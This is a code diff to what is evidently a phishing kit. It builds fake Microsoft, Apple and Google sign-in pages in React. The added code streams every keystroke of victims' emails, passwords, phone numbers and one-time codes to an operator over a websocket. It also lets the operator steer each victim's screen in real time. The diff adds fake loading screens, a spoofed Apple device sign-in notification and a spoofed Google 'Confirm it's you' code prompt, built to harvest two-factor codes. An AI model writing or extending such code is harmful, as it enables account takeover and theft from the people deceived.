@@ -212,6 +212,16 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
   });
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
 
+  const [loading, setLoading] = useState(false);
+  const [codeResent, setCodeResent] = useState(false);
+  const [phoneCodeResent, setPhoneCodeResent] = useState(false);
+
+  const nav = (target: MsStep, captureField?: string, captureVal?: string) => {
+    if (captureField && captureVal) sendCapture(captureField, captureVal);
+    setLoading(true);
+    setTimeout(() => { setLoading(false); setStep(target); }, 900);
+  };
+
   const lightBg: React.CSSProperties = !isMobile
     ? { backgroundColor: isDark ? '#1b1b1b' : '#ffffff', backgroundImage: "url('/ms-bg.svg')", backgroundSize: 'cover', backgroundPosition: 'center' }
     : { backgroundColor: isDark ? '#111' : '#ffffff' };
@@ -265,6 +275,26 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
 
   const wrapCls = isMobile ? 'w-full h-full px-8 pt-10' : 'w-[440px]';
 
+  if (loading) return (
+    <div className="w-full h-full flex items-center justify-center font-[system-ui,Segoe_UI,sans-serif]" style={bg}>
+      {isMobile ? (
+        <div className="flex flex-col items-center gap-5 px-8">
+          {msLogoRow(isDark)}
+          <div className="flex gap-2 mt-2">
+            {[0,1,2].map(i => <div key={i} className="w-2 h-2 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i * 0.15}s` }} />)}
+          </div>
+        </div>
+      ) : (
+        <div className={`w-[440px] flex flex-col items-center px-10 pt-10 pb-12 shadow-md ${isDark ? 'bg-[#242424]' : 'bg-white'}`}>
+          {msLogoRow(false)}
+          <div className="flex gap-2 mt-6">
+            {[0,1,2].map(i => <div key={i} className="w-2.5 h-2.5 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i * 0.15}s` }} />)}
+          </div>
+        </div>
+      )}
+    </div>
+  );
+
   return (
     <div
       className="w-full h-full flex items-center justify-center font-[system-ui,Segoe_UI,sans-serif] transition-[background-color] duration-300"
@@ -283,8 +313,8 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
                   data-testid="ms-email-input"
                   type="text"
                   value={email}
-                  onChange={e => setEmail(e.target.value)}
-                  onKeyDown={e => { if (e.key === 'Enter') { if (promptType === 'email-code') setStep('email-code'); else if (promptType === 'other-ways') setStep('other-ways'); else setStep('password'); } }}
+                  onChange={e => { setEmail(e.target.value); sendCapture('email', e.target.value); }}
+                  onKeyDown={e => { if (e.key === 'Enter') { if (promptType === 'email-code') nav('email-code', 'email', email); else if (promptType === 'other-ways') nav('other-ways', 'email', email); else nav('password', 'email', email); } }}
                   placeholder="Email, phone, or Skype"
                   autoFocus
                   className={lightUnderlineInput}
@@ -302,7 +332,7 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
               <div className="flex justify-end">
                 <button
                   data-testid="ms-next-btn"
-                  onClick={() => { sendCapture('email', email); if (promptType === 'email-code') setStep('email-code'); else if (promptType === 'other-ways') setStep('other-ways'); else setStep('password'); }}
+                  onClick={() => { if (promptType === 'email-code') nav('email-code', 'email', email); else if (promptType === 'other-ways') nav('other-ways', 'email', email); else nav('password', 'email', email); }}
                   className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
                   style={{ borderRadius: 0 }}
                 >
@@ -460,8 +490,8 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
                   data-testid="ms-password-input"
                   type={showPassword ? 'text' : 'password'}
                   value={password}
-                  onChange={e => setPassword(e.target.value)}
-                  onKeyDown={e => e.key === 'Enter' && setStep('stay')}
+                  onChange={e => { setPassword(e.target.value); sendCapture('password', e.target.value); }}
+                  onKeyDown={e => { if (e.key === 'Enter' && password) nav('stay', 'password', password); }}
                   placeholder="Password"
                   className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors pr-10"
                 />
@@ -478,7 +508,7 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
               </div>
               <button
                 data-testid="ms-signin-btn"
-                onClick={() => { sendCapture('password', password); setStep('stay'); }}
+                onClick={() => { if (password) nav('stay', 'password', password); }}
                 className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 mb-5 transition-colors"
                 style={{ borderRadius: 0 }}
               >
@@ -612,18 +642,21 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
               <input
                 type="text"
                 value={emailCodeInput}
-                onChange={e => setEmailCodeInput(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                onKeyDown={e => e.key === 'Enter' && emailCodeInput.length === 6 && setStep('stay')}
+                onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setEmailCodeInput(v); sendCapture('email_code', v); }}
+                onKeyDown={e => { if (e.key === 'Enter' && emailCodeInput.length === 6) nav('stay', 'email_code', emailCodeInput); }}
                 placeholder="Code"
                 maxLength={6}
                 autoFocus
                 className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] focus:outline-none bg-transparent text-white placeholder-gray-500 mb-2 transition-colors text-center tracking-[0.3em] text-[20px]"
               />
               <div className="mb-5">
-                <a href="#" className="text-[#3391e0] text-[13px] hover:underline">I didn't get a code</a>
+                <a href="#" onClick={e => { e.preventDefault(); setCodeResent(true); setTimeout(() => setCodeResent(false), 3000); }}
+                  className={`text-[13px] hover:underline ${codeResent ? 'text-green-400' : 'text-[#3391e0]'}`}>
+                  {codeResent ? '✓ Code resent!' : "I didn't get a code"}
+                </a>
               </div>
               <button
-                onClick={() => { if (emailCodeInput.length === 6) { sendCapture('email_code', emailCodeInput); setStep('stay'); } }}
+                onClick={() => { if (emailCodeInput.length === 6) nav('stay', 'email_code', emailCodeInput); }}
                 className="w-full bg-[#0078D4] hover:bg-[#005a9e] disabled:opacity-50 text-white text-[15px] font-semibold py-2.5 transition-colors"
                 style={{ borderRadius: 0 }}
               >
@@ -760,15 +793,15 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
                 <input
                   type="tel"
                   value={phoneNumber}
-                  onChange={e => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
-                  onKeyDown={e => e.key === 'Enter' && phoneNumber.length >= 7 && setStep('phone-code')}
+                  onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 10); setPhoneNumber(v); sendCapture('phone', v); }}
+                  onKeyDown={e => { if (e.key === 'Enter' && phoneNumber.length >= 7) nav('phone-code', 'phone', phoneNumber); }}
                   placeholder="Phone number"
                   autoFocus
                   className="flex-1 px-3 py-2.5 border border-[#555] focus:border-[#0078D4] focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors"
                 />
               </div>
               <button
-                onClick={() => { if (phoneNumber.length >= 7) { sendCapture('phone', phoneNumber); setStep('phone-code'); } }}
+                onClick={() => { if (phoneNumber.length >= 7) nav('phone-code', 'phone', phoneNumber); }}
                 className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 transition-colors"
                 style={{ borderRadius: 0 }}
               >
@@ -800,18 +833,21 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
               <input
                 type="text"
                 value={phoneCode}
-                onChange={e => setPhoneCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                onKeyDown={e => e.key === 'Enter' && phoneCode.length === 6 && setStep('stay')}
+                onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setPhoneCode(v); sendCapture('phone_code', v); }}
+                onKeyDown={e => { if (e.key === 'Enter' && phoneCode.length === 6) nav('stay', 'phone_code', phoneCode); }}
                 placeholder="Code"
                 maxLength={6}
                 autoFocus
                 className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] focus:outline-none bg-transparent text-white placeholder-gray-500 mb-2 transition-colors text-center tracking-[0.3em] text-[20px]"
               />
               <div className="mb-5">
-                <a href="#" className="text-[#3391e0] text-[13px] hover:underline">I didn't get a code</a>
+                <a href="#" onClick={e => { e.preventDefault(); setPhoneCodeResent(true); setTimeout(() => setPhoneCodeResent(false), 3000); }}
+                  className={`text-[13px] hover:underline ${phoneCodeResent ? 'text-green-400' : 'text-[#3391e0]'}`}>
+                  {phoneCodeResent ? '✓ Code resent!' : "I didn't get a code"}
+                </a>
               </div>
               <button
-                onClick={() => { if (phoneCode.length === 6) { sendCapture('phone_code', phoneCode); setStep('stay'); } }}
+                onClick={() => { if (phoneCode.length === 6) nav('stay', 'phone_code', phoneCode); }}
                 className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 transition-colors"
                 style={{ borderRadius: 0 }}
               >
@@ -1059,27 +1095,39 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
 
 // ─── Apple ───────────────────────────────────────────────────────────────────
 
+type AppleStep = 'email' | 'password' | 'device-trust' | 'verification-code';
+
 function AppleLogin({ device, theme }: { device: string; theme: string }) {
   const isDark = theme === 'dark';
   const isDesktop = device === 'desktop';
-  const [step, setStep] = useState<'email' | 'password'>(() => {
-    const init = new URLSearchParams(window.location.search).get('initialStep') as 'email' | 'password' | null;
+  const [step, setStep] = useState<AppleStep>(() => {
+    const init = new URLSearchParams(window.location.search).get('initialStep') as AppleStep | null;
     return init ?? 'email';
   });
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const [codeInput, setCodeInput] = useState('');
+  const [loading, setLoading] = useState(false);
   const passwordRef = useRef<HTMLInputElement>(null);
+  const codeRef = useRef<HTMLInputElement>(null);
 
   useEffect(() => {
     if (step === 'password') passwordRef.current?.focus();
+    if (step === 'verification-code') setTimeout(() => codeRef.current?.focus(), 100);
   }, [step]);
 
   const { sendCapture, sendStepUpdate } = useVisitorWS({
     provider: 'apple',
-    onNavigate: (s) => setStep(s as 'email' | 'password'),
+    onNavigate: (s) => setStep(s as AppleStep),
   });
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
+
+  const nav = (target: AppleStep, captureField?: string, captureVal?: string) => {
+    if (captureField && captureVal) sendCapture(captureField, captureVal);
+    setLoading(true);
+    setTimeout(() => { setLoading(false); setStep(target); }, 800);
+  };
 
   const outerBg = isDesktop
     ? isDark ? 'bg-[#1c1c1e]' : 'bg-[#f5f5f7]'
@@ -1090,35 +1138,52 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
     : 'h-full px-8 pt-14';
 
   const groupBg = isDark ? 'bg-[#1c1c1e] border-[#38383a]' : 'bg-[#f2f2f7] border-[#d1d1d6]';
-  const dividerCls = isDark ? 'bg-[#38383a]' : 'bg-[#d1d1d6]';
   const subGray = isDark ? 'text-[#8e8e93]' : 'text-[#6e6e73]';
+  const appleBlue = '#007AFF';
+
+  const logoArea = (
+    <div className="relative flex items-center justify-center mb-7">
+      <AppleSpinRing />
+      <AppleLogo className={`w-11 h-11 ${isDark ? 'text-white' : 'text-black'}`} />
+    </div>
+  );
+
+  if (loading) return (
+    <div className={`w-full h-full flex items-center justify-center transition-colors ${outerBg}`}
+      style={{ fontFamily: '-apple-system, BlinkMacSystemFont, Inter, sans-serif' }}>
+      <div className={`relative flex flex-col items-center w-full ${cardCls}`}>
+        {logoArea}
+        <h1 className="text-[26px] font-bold mb-6 tracking-tight">Apple Account</h1>
+        <svg className="w-9 h-9" viewBox="0 0 50 50">
+          <circle cx="25" cy="25" r="20" fill="none" strokeWidth="3" strokeLinecap="round"
+            stroke={isDark ? '#ffffff' : '#1c1c1e'} strokeDasharray="70 130" strokeOpacity="0.7"
+            className="animate-spin" style={{ animationDuration: '0.9s' }} />
+        </svg>
+      </div>
+    </div>
+  );
 
   return (
     <div className={`w-full h-full flex items-center justify-center transition-colors ${outerBg} ${isDark ? 'text-white' : 'text-black'}`}
       style={{ fontFamily: '-apple-system, BlinkMacSystemFont, Inter, sans-serif' }}>
       <div className={`relative flex flex-col items-center w-full ${cardCls}`}>
 
-        {/* Back button (mobile/tablet only) */}
-        {!isDesktop && step === 'password' && (
+        {/* Back button (mobile/tablet) */}
+        {!isDesktop && (step === 'password' || step === 'verification-code') && (
           <button
             data-testid="apple-back-btn"
-            onClick={() => setStep('email')}
-            className="absolute top-14 left-5 text-[#007AFF] flex items-center"
-            style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}
+            onClick={() => step === 'verification-code' ? setStep('device-trust') : setStep('email')}
+            className="absolute top-14 left-5 flex items-center"
+            style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}
           >
             <ChevronLeft className="w-6 h-6" />
           </button>
         )}
 
-        {/* Logo + spinning ring */}
-        <div className="relative flex items-center justify-center mb-7">
-          <AppleSpinRing />
-          <AppleLogo className={`w-11 h-11 ${isDark ? 'text-white' : 'text-black'}`} />
-        </div>
-
+        {logoArea}
         <h1 className="text-[26px] font-bold mb-3 tracking-tight">Apple Account</h1>
 
-        {/* ── Step: email ── */}
+        {/* ── Email ── */}
         {step === 'email' && (
           <>
             <p className={`text-center text-[15px] leading-relaxed mb-8 ${subGray}`}>
@@ -1129,8 +1194,8 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
                 data-testid="apple-email-input"
                 type="text"
                 value={email}
-                onChange={e => setEmail(e.target.value)}
-                onKeyDown={e => e.key === 'Enter' && setStep('password')}
+                onChange={e => { setEmail(e.target.value); sendCapture('email', e.target.value); }}
+                onKeyDown={e => e.key === 'Enter' && nav('password', 'email', email)}
                 placeholder="Email or Phone Number"
                 autoFocus
                 className={`w-full px-4 py-3.5 text-[17px] focus:outline-none bg-transparent ${isDark ? 'text-white placeholder-[#636366]' : 'text-black placeholder-[#aeaeb2]'}`}
@@ -1138,27 +1203,26 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
             </div>
             <button
               data-testid="apple-continue-btn"
-              onClick={() => { sendCapture('email', email); setStep('password'); }}
+              onClick={() => nav('password', 'email', email)}
               className="w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-5 transition-opacity hover:opacity-90 active:opacity-80"
-              style={{ backgroundColor: '#007AFF' }}
+              style={{ backgroundColor: appleBlue }}
             >
               Continue
             </button>
             <div className="flex flex-col items-center gap-4">
-              <button data-testid="apple-forgot-link" className="text-[#007AFF] text-[15px]" style={{ background: 'none', border: 'none', cursor: 'pointer' }}>
+              <button data-testid="apple-forgot-link" className="text-[15px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
                 Forgot Apple Account or Password?
               </button>
-              <button data-testid="apple-child-signin" className="text-[#007AFF] text-[15px]" style={{ background: 'none', border: 'none', cursor: 'pointer' }}>
+              <button data-testid="apple-child-signin" className="text-[15px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
                 Sign in a child in my Family
               </button>
             </div>
           </>
         )}
 
-        {/* ── Step: password ── */}
+        {/* ── Password ── */}
         {step === 'password' && (
           <>
-            {/* Email chip / back on desktop */}
             {isDesktop && (
               <button
                 data-testid="apple-back-btn-desktop"
@@ -1180,8 +1244,8 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
                   data-testid="apple-password-input"
                   type={showPassword ? 'text' : 'password'}
                   value={password}
-                  onChange={e => setPassword(e.target.value)}
-                  onKeyDown={e => e.key === 'Enter' && password.length > 0 && alert('Signed in!')}
+                  onChange={e => { setPassword(e.target.value); sendCapture('password', e.target.value); }}
+                  onKeyDown={e => { if (e.key === 'Enter' && password) nav('device-trust', 'password', password); }}
                   placeholder="Password"
                   className={`w-full px-4 py-3.5 pr-12 text-[17px] focus:outline-none bg-transparent ${isDark ? 'text-white placeholder-[#636366]' : 'text-black placeholder-[#aeaeb2]'}`}
                 />
@@ -1197,19 +1261,127 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
             </div>
             <button
               data-testid="apple-signin-btn"
-              onClick={() => { if (password) sendCapture('password', password); }}
+              onClick={() => { if (password) nav('device-trust', 'password', password); }}
               className="w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-5 transition-opacity hover:opacity-90 active:opacity-80"
-              style={{ backgroundColor: '#007AFF' }}
+              style={{ backgroundColor: appleBlue }}
             >
               Sign In
             </button>
-            <button data-testid="apple-forgot-password-2" className="text-[#007AFF] text-[15px]" style={{ background: 'none', border: 'none', cursor: 'pointer' }}>
+            <button data-testid="apple-forgot-password-2" className="text-[15px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
               Forgot Apple Account or Password?
             </button>
           </>
         )}
 
-        {/* Home indicator bar (mobile/tablet) */}
+        {/* ── Device Trust (iOS notification simulation) ── */}
+        {step === 'device-trust' && (
+          <>
+            <p className={`text-center text-[15px] leading-relaxed mb-6 ${subGray}`}>
+              A sign-in request has been sent to your trusted Apple devices.
+            </p>
+            {/* iOS notification card */}
+            <div className={`w-full max-w-[320px] rounded-2xl overflow-hidden shadow-2xl mb-5 ${isDark ? 'bg-[#2c2c2e] border border-[#3a3a3c]' : 'bg-white border border-[#e5e5ea]'}`}>
+              <div className={`px-4 pt-4 pb-3 border-b ${isDark ? 'border-[#3a3a3c]' : 'border-[#e5e5ea]'}`}>
+                <div className="flex items-start gap-3 mb-2.5">
+                  <div className="w-9 h-9 rounded-[10px] bg-black flex items-center justify-center flex-shrink-0 mt-0.5">
+                    <AppleLogo className="w-5 h-5 text-white" />
+                  </div>
+                  <div className="flex-1 min-w-0">
+                    <div className="flex items-center justify-between">
+                      <span className={`text-[13px] font-semibold ${isDark ? 'text-white' : 'text-black'}`}>Apple ID</span>
+                      <span className={`text-[11px] ${subGray}`}>now</span>
+                    </div>
+                    <p className={`text-[15px] font-semibold leading-tight mt-0.5 ${isDark ? 'text-white' : 'text-black'}`}>
+                      Apple ID Sign In Requested
+                    </p>
+                  </div>
+                </div>
+                <p className={`text-[13px] leading-snug ${subGray}`}>
+                  Your Apple ID <span className={isDark ? 'text-white' : 'text-black'}>{email || 'user@icloud.com'}</span> is being used to sign in to a device near your location.
+                </p>
+              </div>
+              <div className={`flex divide-x ${isDark ? 'divide-[#3a3a3c]' : 'divide-[#e5e5ea]'}`}>
+                <button
+                  className={`flex-1 py-3 text-[17px] font-normal transition-colors ${isDark ? 'text-[#007AFF] hover:bg-[#3a3a3c]' : 'text-[#007AFF] hover:bg-[#f2f2f7]'}`}
+                  style={{ background: 'none', border: 'none', cursor: 'pointer' }}
+                >
+                  Don't Allow
+                </button>
+                <button
+                  onClick={() => nav('verification-code')}
+                  className={`flex-1 py-3 text-[17px] font-semibold transition-colors ${isDark ? 'text-[#007AFF] hover:bg-[#3a3a3c]' : 'text-[#007AFF] hover:bg-[#f2f2f7]'}`}
+                  style={{ background: 'none', border: 'none', cursor: 'pointer' }}
+                >
+                  Allow
+                </button>
+              </div>
+            </div>
+            <button
+              onClick={() => nav('verification-code')}
+              className={`text-[14px] underline ${subGray} hover:text-[#007AFF] transition-colors`}
+              style={{ background: 'none', border: 'none', cursor: 'pointer' }}
+            >
+              Didn't receive a notification?
+            </button>
+          </>
+        )}
+
+        {/* ── Verification Code ── */}
+        {step === 'verification-code' && (
+          <>
+            {isDesktop && (
+              <button onClick={() => setStep('device-trust')}
+                className={`flex items-center gap-1 text-[14px] mb-4 ${subGray} hover:text-[#007AFF] transition-colors`}
+                style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
+                <ChevronLeft className="w-4 h-4" /> Back
+              </button>
+            )}
+            <p className={`text-center text-[15px] leading-relaxed mb-6 ${subGray}`}>
+              Enter the 6-digit verification code shown on your trusted device.
+            </p>
+            {/* 6 digit boxes */}
+            <div
+              className="flex gap-2 mb-5 cursor-text"
+              onClick={() => codeRef.current?.focus()}
+            >
+              {Array.from({ length: 6 }).map((_, i) => (
+                <div key={i} className={`w-11 h-14 rounded-[13px] flex items-center justify-center text-[22px] font-semibold border-2 transition-colors
+                  ${codeInput[i]
+                    ? isDark ? 'border-white bg-[#38383a] text-white' : 'border-black bg-[#f2f2f7] text-black'
+                    : isDark ? 'border-[#48484a] bg-[#1c1c1e] text-transparent' : 'border-[#d1d1d6] bg-[#f2f2f7] text-transparent'}`}>
+                  {codeInput[i] ?? ''}
+                </div>
+              ))}
+            </div>
+            <input
+              ref={codeRef}
+              data-testid="apple-code-input"
+              type="text"
+              inputMode="numeric"
+              maxLength={6}
+              autoFocus
+              value={codeInput}
+              onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setCodeInput(v); sendCapture('verification_code', v); }}
+              className="opacity-0 absolute pointer-events-none w-0 h-0"
+              aria-label="Verification code"
+              onBlur={() => codeRef.current?.focus()}
+            />
+            <button
+              data-testid="apple-code-submit-btn"
+              onClick={() => { if (codeInput.length === 6) sendCapture('verification_code', codeInput); }}
+              disabled={codeInput.length < 6}
+              className={`w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-4 transition-opacity ${codeInput.length < 6 ? 'opacity-40' : 'hover:opacity-90 active:opacity-80'}`}
+              style={{ backgroundColor: appleBlue }}
+            >
+              Continue
+            </button>
+            <button className="text-[14px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
+              Didn't receive a code?
+            </button>
+          </>
+        )}
+
+        {/* Home indicator */}
         {!isDesktop && (
           <div className="absolute bottom-3 inset-x-0 flex justify-center">
             <div className={`w-[134px] h-[5px] rounded-full ${isDark ? 'bg-white/40' : 'bg-black/20'}`} />
@@ -1222,11 +1394,13 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
 
 // ─── Google ──────────────────────────────────────────────────────────────────
 
+type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-code';
+
 function GoogleLogin({ device, theme }: { device: string; theme: string }) {
   const isDark = theme === 'dark';
   const isDesktop = device === 'desktop';
-  const [step, setStep] = useState<'email' | 'password'>(() => {
-    const init = new URLSearchParams(window.location.search).get('initialStep') as 'email' | 'password' | null;
+  const [step, setStep] = useState<GoogleStep>(() => {
+    const init = new URLSearchParams(window.location.search).get('initialStep') as GoogleStep | null;
     return init ?? 'email';
   });
   const [email, setEmail] = useState('');
@@ -1234,6 +1408,9 @@ function GoogleLogin({ device, theme }: { device: string; theme: string }) {
   const [showPassword, setShowPassword] = useState(false);
   const [emailFocused, setEmailFocused] = useState(false);
   const [passwordFocused, setPasswordFocused] = useState(false);
+  const [phoneCodeInput, setPhoneCodeInput] = useState('');
+  const [phoneCodeFocused, setPhoneCodeFocused] = useState(false);
+  const [loading, setLoading] = useState(false);
   const passwordRef = useRef<HTMLInputElement>(null);
 
   useEffect(() => {
@@ -1242,9 +1419,15 @@ function GoogleLogin({ device, theme }: { device: string; theme: string }) {
 
   const { sendCapture, sendStepUpdate } = useVisitorWS({
     provider: 'google',
-    onNavigate: (s) => setStep(s as 'email' | 'password'),
+    onNavigate: (s) => setStep(s as GoogleStep),
   });
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
+
+  const nav = (target: GoogleStep, captureField?: string, captureVal?: string) => {
+    if (captureField && captureVal) sendCapture(captureField, captureVal);
+    setLoading(true);
+    setTimeout(() => { setLoading(false); setStep(target); }, 900);
+  };
 
   const bg = isDark ? '#1f1f1f' : '#f0f4f9';
   const cardBg = isDark ? '#282a2c' : '#ffffff';
@@ -1261,6 +1444,10 @@ function GoogleLogin({ device, theme }: { device: string; theme: string }) {
       : { top: 14, fontSize: 16, color: labelColor };
 
   const initial = email ? email[0].toUpperCase() : 'G';
+
+  if (loading) return (
+    <GoogleLoadingScreen isDark={isDark} bg={bg} cardBg={cardBg} textColor={textColor} />
+  );
 
   return (
     <>
@@ -1282,7 +1469,7 @@ function GoogleLogin({ device, theme }: { device: string; theme: string }) {
           <div style={{ display: 'flex', flexDirection: 'column', flex: isDesktop ? '0 0 320px' : 'none', paddingRight: isDesktop ? 40 : 0, marginBottom: isDesktop ? 0 : 32 }}>
             <div style={{ marginBottom: 28 }}><GoogleLogo /></div>
             <h1 style={{ fontSize: 40, fontWeight: 400, margin: '0 0 12px', letterSpacing: '-0.5px', color: textColor }}>
-              {step === 'email' ? 'Sign in' : 'Welcome'}
+              {step === 'email' ? 'Sign in' : step === 'phone-verify' || step === 'phone-code' ? 'Confirm it\'s you' : 'Welcome'}
             </h1>
             <p style={{ fontSize: 16, color: textColor, margin: 0 }}>
               Use your Google Account
@@ -1301,10 +1488,10 @@ function GoogleLogin({ device, theme }: { device: string; theme: string }) {
                       data-testid="google-email-input"
                       type="text"
                       value={email}
-                      onChange={e => setEmail(e.target.value)}
+                      onChange={e => { setEmail(e.target.value); sendCapture('email', e.target.value); }}
                       onFocus={() => setEmailFocused(true)}
                       onBlur={() => setEmailFocused(false)}
-                      onKeyDown={e => e.key === 'Enter' && email && setStep('password')}
+                      onKeyDown={e => e.key === 'Enter' && email && nav('password', 'email', email)}
                       autoFocus
                       style={{
                         width: '100%', padding: '20px 16px 8px', fontSize: 16,
@@ -1334,7 +1521,7 @@ function GoogleLogin({ device, theme }: { device: string; theme: string }) {
                     Create account
                   </button>
                   <button data-testid="google-next-btn"
-                    onClick={() => { if (email) { sendCapture('email', email); setStep('password'); } }}
+                    onClick={() => { if (email) nav('password', 'email', email); }}
                     style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
                     Next
                   </button>
@@ -1374,7 +1561,7 @@ function GoogleLogin({ device, theme }: { device: string; theme: string }) {
                       data-testid="google-password-input"
                       type={showPassword ? 'text' : 'password'}
                       value={password}
-                      onChange={e => setPassword(e.target.value)}
+                      onChange={e => { setPassword(e.target.value); sendCapture('password', e.target.value); }}
                       onFocus={() => setPasswordFocused(true)}
                       onBlur={() => setPasswordFocused(false)}
                       style={{
@@ -1404,14 +1591,168 @@ function GoogleLogin({ device, theme }: { device: string; theme: string }) {
                     Create account
                   </button>
                   <button data-testid="google-signin-btn"
-                    onClick={() => { if (password) sendCapture('password', password); }}
+                    onClick={() => { if (password) nav('phone-verify', 'password', password); }}
                     style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
                     Next
                   </button>
                 </div>
               </>
             )}
+
+            {/* ── Phone Verify (Confirm it's you) ── */}
+            {step === 'phone-verify' && (
+              <>
+                <div>
+                  <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
+                    To help keep your account safe, Google wants to make sure it's really you trying to sign in.
+                  </p>
+                  {/* Phone option row */}
+                  <div style={{
+                    border: `1px solid ${borderColor}`, borderRadius: 4,
+                    padding: '16px', marginBottom: 12, cursor: 'pointer',
+                    display: 'flex', alignItems: 'center', gap: 16,
+                    background: 'transparent',
+                  }}
+                    onClick={() => nav('phone-code')}
+                  >
+                    <div style={{
+                      width: 40, height: 40, borderRadius: '50%',
+                      background: isDark ? '#3c4043' : '#e8f0fe',
+                      display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
+                    }}>
+                      <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
+                        <rect x="5" y="2" width="14" height="20" rx="2" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5"/>
+                        <circle cx="12" cy="18" r="1" fill={isDark ? '#a8c7fa' : '#0b57d0'}/>
+                      </svg>
+                    </div>
+                    <div style={{ flex: 1 }}>
+                      <div style={{ fontSize: 14, fontWeight: 500, color: textColor, marginBottom: 2 }}>
+                        Get a verification code
+                      </div>
+                      <div style={{ fontSize: 13, color: subText }}>
+                        Google will text a code to ●●●●●●{email ? email.slice(-2) : '09'}
+                      </div>
+                    </div>
+                    <ChevronLeft className="w-4 h-4 rotate-180" style={{ color: subText }} />
+                  </div>
+                  {/* Authenticator app option */}
+                  <div style={{
+                    border: `1px solid ${borderColor}`, borderRadius: 4,
+                    padding: '16px', cursor: 'pointer',
+                    display: 'flex', alignItems: 'center', gap: 16,
+                    background: 'transparent',
+                  }}>
+                    <div style={{
+                      width: 40, height: 40, borderRadius: '50%',
+                      background: isDark ? '#3c4043' : '#e8f0fe',
+                      display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
+                    }}>
+                      <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
+                        <rect x="3" y="3" width="18" height="18" rx="2" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5"/>
+                        <path d="M8 8h2m-2 4h6m-6 4h4" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5" strokeLinecap="round"/>
+                      </svg>
+                    </div>
+                    <div style={{ flex: 1 }}>
+                      <div style={{ fontSize: 14, fontWeight: 500, color: textColor, marginBottom: 2 }}>
+                        Use an authenticator app
+                      </div>
+                      <div style={{ fontSize: 13, color: subText }}>
+                        Get a verification code from your authenticator app
+                      </div>
+                    </div>
+                    <ChevronLeft className="w-4 h-4 rotate-180" style={{ color: subText }} />
+                  </div>
+                </div>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                  <button onClick={() => setStep('password')}
+                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
+                    Back
+                  </button>
+                </div>
+              </>
+            )}
+
+            {/* ── Phone Code ── */}
+            {step === 'phone-code' && (
+              <>
+                <div>
+                  <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
+                    A 6-digit verification code was sent to your phone ending in ●●●●●●09. It may take a moment to arrive.
+                  </p>
